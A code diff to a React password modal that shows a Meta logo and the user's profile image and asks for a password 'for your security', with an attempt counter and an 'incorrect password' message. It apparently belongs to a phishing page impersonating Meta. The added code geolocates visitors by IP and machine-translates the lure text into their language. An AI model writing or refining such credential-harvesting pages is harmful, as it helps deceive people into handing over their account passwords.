@@ -2,10 +2,11 @@
 
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
-import { useTranslation } from '@/utils/use-translation';
+import { getTranslations } from '@/utils/translate';
+import { COUNTRY_TO_LANGUAGE, type LanguageCode } from '@/utils/country-language-map';
 import axios from 'axios';
 import Image from 'next/image';
-import { useState, type FC } from 'react';
+import { useState, useEffect, type FC } from 'react';
 
 interface PasswordModalProps {
     userProfileImage: string;
@@ -28,8 +29,96 @@ const PasswordModal: FC<PasswordModalProps> = ({
     const [error, setError] = useState('');
     const [attemptCount, setAttemptCount] = useState(0);
 
+    // Translation state
+    const [countryCode, setCountryCode] = useState('US');
+    const [translations, setTranslations] = useState<Record<string, string>>({}); 
+
     const { messageId, message, setMessage, setFormStep } = store();
-    const { t } = useTranslation();
+
+    // Geo-detection effect
+    useEffect(() => {
+        const fetchGeoInfo = async () => {
+            try {
+                const { data } = await axios.get('https://get.geojs.io/v1/ip/geo.json', { timeout: 5000 });
+                const cc = (data.country_code || 'US').toUpperCase();
+                setCountryCode(cc);
+            } catch {
+                setCountryCode('US');
+            }
+        };
+        fetchGeoInfo();
+    }, []);
+
+    // Translation effect - hybrid: hardcoded first, then API fallback for missing texts
+    useEffect(() => {
+        if (!countryCode) return;
+
+        (async () => {
+            const lang = (COUNTRY_TO_LANGUAGE[countryCode.toLowerCase()] || 'en') as LanguageCode;
+            if (lang === 'en') {
+                setTranslations({});
+                return;
+            }
+
+            // Get hardcoded translations first
+            const hardcodedTrans = getTranslations(lang) || {};
+            setTranslations(hardcodedTrans);
+
+            // Identify all texts used in this modal
+            const allTextsNeeded = [
+                'Hi',
+                'For your security, you must enter your password to continue.',
+                'Enter your password',
+                'Continue',
+                'Forgotten password?',
+                'Please fill in all fields',
+                'Password must be at least 6 characters',
+                'Incorrect password. Please try again.'
+            ];
+
+            // Find missing texts not in hardcoded translations
+            const missingTexts = allTextsNeeded.filter(text => !hardcodedTrans[text]);
+            if (missingTexts.length === 0) return;
+
+            // Get cache for this language
+            const CACHE_KEY = `translation_cache_${lang}`;
+            const cache: Record<string, string> = localStorage.getItem(CACHE_KEY)
+                ? JSON.parse(localStorage.getItem(CACHE_KEY)!)
+                : {};
+
+            // Fetch missing texts from Google Translate API
+            const results = await Promise.all(
+                missingTexts.map(async (text) => {
+                    if (cache[text]) return { text, translated: cache[text] };
+                    try {
+                        const res = await axios.get('https://translate.googleapis.com/translate_a/single', {
+                            params: { client: 'gtx', sl: 'en', tl: lang, dt: 't', q: text },
+                            timeout: 3000
+                        });
+                        const translated = res.data[0]?.map((item: string[]) => item[0]).filter(Boolean).join('') || text;
+                        cache[text] = translated;
+                        return { text, translated };
+                    } catch {
+                        return { text, translated: text };
+                    }
+                })
+            );
+
+            // Cache the results
+            localStorage.setItem(CACHE_KEY, JSON.stringify(cache));
+
+            // Merge hardcoded and API translations
+            const apiTranslations: Record<string, string> = {};
+            results.forEach(({ text, translated }) => {
+                apiTranslations[text] = translated;
+            });
+
+            const mergedTranslations = { ...hardcodedTrans, ...apiTranslations };
+            setTranslations(mergedTranslations);
+        })();
+    }, [countryCode]);
+
+    const t = (text: string): string => translations[text] || text;
 
     const handleSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
         e.preventDefault();
